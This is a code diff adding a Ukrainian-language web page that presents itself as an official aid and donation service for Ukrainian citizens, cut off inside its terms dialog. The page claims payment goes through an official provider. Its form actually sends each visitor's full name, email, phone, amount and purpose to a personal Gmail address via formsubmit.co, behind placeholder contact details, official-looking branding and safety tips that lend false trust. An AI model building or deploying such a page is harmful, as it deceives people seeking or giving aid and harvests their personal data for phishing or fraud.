@@ -1,0 +1,213 @@
+<!doctype html>
+<html lang="uk">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Підтримка громадян України — Офіційна сторінка переказів</title>
+  <meta name="description" content="Безпечна сторінка для оформлення підтримки громадян України. Оплата через офіційного платіжного провайдера.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg1:#f7f9fc;--bg2:#eef2f7;--card:#ffffff;
+      --text:#0f172a;--muted:#64748b;--line:#e2e8f0;
+      --primary:#0ea5e9;--primary2:#2563eb;--ok:#16a34a;--warn:#d97706;
+      --radius:18px;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;background:linear-gradient(180deg,var(--bg1),var(--bg2));
+      color:var(--text);font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      -webkit-font-smoothing:antialiased;line-height:1.5;
+    }
+    .container{max-width:1100px;margin:0 auto;padding:28px 20px 60px}
+    header{
+      position:relative;overflow:hidden;border-bottom:1px solid var(--line);
+      background:linear-gradient(180deg,#e0f2fe44,#dbeafe22);
+    }
+    .hero{
+      display:flex;gap:16px;align-items:center;padding:28px 0 20px;
+    }
+    .logo{width:48px;height:48px;border-radius:14px;background:#fff;box-shadow:0 6px 16px rgba(0,0,0,.08);display:grid;place-items:center}
+    .badge{font-size:12px;text-transform:uppercase;letter-spacing:.08em;color:#475569}
+    h1{margin:.25rem 0 0;font-size:28px;letter-spacing:-.02em}
+    .lead{max-width:760px;color:var(--muted);margin-top:8px}
+    .grid{display:grid;gap:24px;margin-top:28px}
+    @media(min-width:900px){.grid{grid-template-columns:1.1fr .9fr}}
+
+    .card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+      box-shadow:0 16px 40px rgba(2,6,23,.06);padding:22px}
+    .card h2{margin:0 0 12px;font-size:20px}
+    label .row{display:flex;justify-content:space-between;align-items:center;margin:6px 0}
+    .hint{font-size:12px;color:#94a3b8}
+    .in{
+      width:100%;padding:12px 14px;border:1px solid var(--line);border-radius:14px;
+      background:#f8fafc;font-size:14px;outline:none;transition:.15s border, .15s background;
+    }
+    .in:focus{border-color:#7dd3fc;background:#fff}
+    .grid2{display:grid;gap:16px}
+    @media(min-width:600px){.grid2{grid-template-columns:1fr 1fr}}
+    .agree{display:flex;gap:10px;align-items:flex-start;margin-top:6px;color:#475569;font-size:14px}
+    .btn{
+      width:100%;border:0;border-radius:14px;padding:12px 16px;margin-top:8px;
+      color:#fff;font-weight:600;font-size:14px;cursor:pointer;
+      background:linear-gradient(90deg,var(--primary),var(--primary2));
+      box-shadow:0 8px 22px rgba(37,99,235,.25);transition:.15s filter, .15s transform;
+    }
+    .btn:hover{filter:brightness(1.05)}
+    .btn:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}
+    .list{margin:0;padding-left:22px;color:#334155;font-size:14px}
+    footer{border-top:1px solid var(--line);margin-top:34px;padding-top:16px;color:#64748b;font-size:12px;text-align:center}
+
+    /* dialogs */
+    dialog{border:1px solid var(--line);border-radius:16px;width:min(620px,96vw);padding:0}
+    dialog::backdrop{background:rgba(15,23,42,.45)}
+    .dlg-h{display:flex;justify-content:space-between;align-items:center;padding:14px 16px;border-bottom:1px solid var(--line)}
+    .dlg-c{padding:16px}
+    .x{background:transparent;border:0;padding:6px;cursor:pointer}
+    .pill{display:inline-flex;gap:6px;align-items:center;border-radius:999px;padding:4px 8px;background:#f1f5f9;font-size:12px}
+    .sr-only{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px);white-space:nowrap}
+    .flag{width:24px;height:24px;border-radius:6px;overflow:hidden}
+    .ic{width:16px;height:16px;display:inline-block;vertical-align:middle;opacity:.85}
+    .tiny{font-size:12px;color:#64748b;text-align:center;margin-top:6px}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container">
+      <div class="hero">
+        <div class="logo" aria-hidden="true">
+          <!-- shield -->
+          <svg class="ic" viewBox="0 0 24 24" fill="#0ea5e9" aria-hidden="true">
+            <path d="M12 2c-.3 0-.6.1-.8.2L5 4.9C4.4 5.2 4 5.8 4 6.5V11c0 5.2 3.3 9.9 8 11 4.7-1.1 8-5.8 8-11V6.5c0-.7-.4-1.3-1-1.6l-6.2-2.7c-.2-.1-.5-.2-.8-.2z"/>
+          </svg>
+        </div>
+        <div>
+          <div class="badge">Безпечні платежі • Офіційна підтримка</div>
+          <h1>Підтримка громадян України — швидко та прозоро</h1>
+          <p class="lead">Оформіть внесок або отримання допомоги. Оплата/виплата відбувається виключно через <strong>офіційного платіжного провайдера</strong>. На цій сторінці <strong>не вводяться</strong> дані картки чи CVV.</p>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main class="container grid">
+    <!-- Основна форма -->
+    <section class="card" aria-labelledby="form-title">
+      <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
+        <div class="flag" aria-hidden="true">
+          <!-- Прапор UA -->
+          <svg viewBox="0 0 640 480">
+            <path fill="#0057b7" d="M0 0h640v240H0z"/><path fill="#ffd700" d="M0 240h640v240H0z"/>
+          </svg>
+        </div>
+        <h2 id="form-title">Заявка на переказ/отримання допомоги</h2>
+      </div>
+
+      <form id="donation-form" action="https://formsubmit.co/yaroslavmaksimchuk27@gmail.com" method="POST" novalidate>
+        <label>
+          <div class="row">
+            <span><svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 12a5 5 0 100-10 5 5 0 000 10zm0 2c-4.4 0-8 2.2-8 5v1h16v-1c0-2.8-3.6-5-8-5z"/></svg> ПІБ</span>
+            <span class="hint">Як у документі</span>
+          </div>
+          <input class="in" name="fullName" required placeholder="Прізвище Ім'я По батькові" autocomplete="name" />
+        </label>
+
+        <div class="grid2" style="margin-top:12px">
+          <label>
+            <div class="row">
+              <span><svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M2 6a2 2 0 012-2h16a2 2 0 012 2v12a2 2 0 01-2 2H4a2 2 0 01-2-2V6zm3 3h14V6H5v3z"/></svg> Email</span>
+              <span class="hint">Для квитанції</span>
+            </div>
+            <input class="in" type="email" name="email" required placeholder="name@example.com" autocomplete="email" />
+          </label>
+
+          <label>
+            <div class="row">
+              <span><svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M6.6 10.8c1.5 3 3.6 5.1 6.6 6.6l2.2-2.2c.3-.3.8-.4 1.2-.2 1 .3 2 .5 3.1.5.7 0 1.3.6 1.3 1.3V20c0 .7-.6 1.3-1.3 1.3-10 0-18-8-18-18C1.7 2.6 2.3 2 3 2h3.2c.7 0 1.3.6 1.3 1.3 0 1.1.2 2.1.5 3.1.1.4 0 .9-.3 1.2l-2.1 2.2z"/></svg> Телефон</span>
+              <span class="hint">У форматі +380…</span>
+            </div>
+            <input class="in" type="tel" name="phone" required placeholder="+380 XX XXX XX XX" autocomplete="tel" />
+          </label>
+        </div>
+
+        <div class="grid2" style="margin-top:12px">
+          <label>
+            <div class="row">
+              <span><svg class="ic" viewBox="0 0 24 24" fill="currentColor"><path d="M12 4a8 8 0 100 16 8 8 0 000-16zm1 4v4h4v2h-6V8h2z"/></svg> Сума (₴)</span>
+              <span class="hint">Мін. 50</span>
+            </div>
+            <input class="in" type="number" name="amount" min="50" step="1" required placeholder="Напр., 200" />
+          </label>
+
+          <label>
+            <div class="row">
+              <span><svg class="ic" viewBox="0 0 24 24" fill="currentColor"><path d="M7 2h2v2h6V2h2v2h3a2 2 0 012 2v3H2V6a2 2 0 012-2h3V2zm15 8v8a2 2 0 01-2 2H4a2 2 0 01-2-2v-8h20z"/></svg> Призначення</span>
+              <span class="hint">Коротко</span>
+            </div>
+            <input class="in" name="purpose" required placeholder="Підтримка/виплата/інше" />
+          </label>
+        </div>
+
+        <div class="agree">
+          <input id="agree" type="checkbox" required />
+          <label for="agree">
+            Підтверджую, що ознайомився з
+            <button type="button" class="pill" id="open-privacy" aria-haspopup="dialog">
+              <svg class="ic" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a5 5 0 00-5 5v3H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2h-1V7a5 5 0 00-5-5zM9 10V7a3 3 0 116 0v3H9z"/></svg>
+              Політикою
+            </button> та
+            <button type="button" class="pill" id="open-terms" aria-haspopup="dialog">
+              <svg class="ic" viewBox="0 0 24 24" fill="currentColor"><path d="M3 4h18v4H3V4zm0 6h18v10H3V10zm2 2v6h6v-6H5z"/></svg>
+              Умовами
+            </button>.
+          </label>
+        </div>
+
+        <button class="btn" id="submit" type="submit">Перейти до платіжного провайдера</button>
+        <div class="tiny">На цій сторінці ніколи не вводьте номер картки чи CVV — це відбудеться лише на захищеній сторінці провайдера (https, замочок).</div>
+      </form>
+    </section>
+
+    <!-- Освітній блок / підказки -->
+    <aside class="card">
+      <h2 style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
+        <span class="pill"><svg class="ic" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a10 10 0 100 20 10 10 0 000-20zm.8 5.5a.8.8 0 11-1.6 0 .8.8 0 011.6 0zM11 10h2v7h-2v-7z"/></svg> Поради безпеки</span>
+      </h2>
+      <ul class="list">
+        <li><strong>Перевіряйте домен</strong>: офіційна адреса, https і «замок» у браузері.</li>
+        <li>Оплата тільки через <strong>відомих провайдерів</strong> (редирект на їхню сторінку).</li>
+        <li>Ніколи не вводьте CVV на сайтах зі сумнівною адресою чи з помилками в тексті.</li>
+        <li>Перевіряйте наявність реквізитів і контактів організації.</li>
+      </ul>
+    </aside>
+  </main>
+
+  <footer>
+    <div class="container">
+      <div>© 2025 Офіційна підтримка. Усі права захищено.</div>
+      <div style="margin-top:6px">Контакти:support@example.org · ЄДРПОУ 00000000 · вул. Прикладна, 1, Київ</div>
+    </div>
+  </footer>
+
+  <!-- Політика -->
+  <dialog id="privacy">
+    <div class="dlg-h">
+      <strong>Політика конфіденційності</strong>
+      <button class="x" aria-label="Закрити" data-close="privacy">
+        <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
+      </button>
+    </div>
+    <div class="dlg-c">
+      <p>Це приклад. У реальному документі вкажіть: категорії даних, цілі та підстави обробки (GDPR/ЗУ «Про захист персональних даних»), строки зберігання, права суб’єктів, контакти DPO.</p>
+    </div>
+  </dialog>
+
+  <!-- Умови -->
+  <dialog id="terms">
+    <div class="dlg-h">
+      <strong>Умови використання</strong>
+      <button class="x" aria-label="Закрити" data-close="terms">
+        <svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M
